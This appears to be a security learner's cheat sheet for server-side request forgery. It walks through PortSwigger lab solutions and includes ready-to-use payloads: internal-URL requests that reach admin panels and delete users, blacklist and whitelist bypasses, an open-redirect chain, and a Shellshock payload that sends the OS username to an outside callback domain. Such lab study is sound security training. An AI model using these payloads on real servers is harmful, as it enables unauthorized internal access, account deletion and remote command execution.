# SSRF

```text
SSRF:

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.

- SSRF attack against the server:

    • Browse to /admin and observe that you can't directly access the admin page.
    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.
    • Read the HTML to identify the URL to delete the target user, which is: http://localhost/admin/delete?username=carlos
    • Submit this URL in the stockApi parameter, to deliver the SSRF attack.

- SSRF against others

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
    • Click "Clear §", change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click "Add §".
    • Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    • Click "Start attack".
    • Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
    • Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos

- SSRF with blacklist

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked.
    • Bypass the block by changing the URL to: http://127.1/
    • Change the URL to http://127.1/admin and observe that the URL is blocked again.
    • Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.


- SSRF with whitelist

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
    • Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
    • Append a # to the username and observe that the URL is now rejected.
    • Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
    • Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.

- SSRF Open redirection:

    • Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
    • Try tampering with the stockApi parameter and observe that it isn't possible to make the server issue the request directly to a different host.
    • Click "next product" and observe that the path parameter is placed into the Location header of a redirection response, resulting in an open redirection.
    • Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: /product/nextProduct?path=http://192.168.0.12:8080/admin
    • The stock checker should follow the redirection and show you the admin page. You can then amend the path to delete the target user: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

- SSRF out-of-band:

    • In Burp Suite Professional, go to the Burp menu and launch the Burp Collaborator client.
    • Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
    • Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
    • Change the Referer header to use the generated Burp Collaborator domain in place of the original domain. Send the request.
    • Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
    • You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

- Blind SSRF with Shellshock:

    • In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
    • Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
    • Browse the site.
    • Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
    • Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
    • Send the request to the product page to Burp Intruder.
    • Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
    • Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
    • Click "Clear §", change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1), click "Add §".
    • Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
    • Click "Start attack".
    • When the attack completes, go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
    • You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
    • To complete the lab, enter the name of the OS user.


Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000

GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Enum IP or ports

**Tools**
https://github.com/tarunkant/Gopherus
```

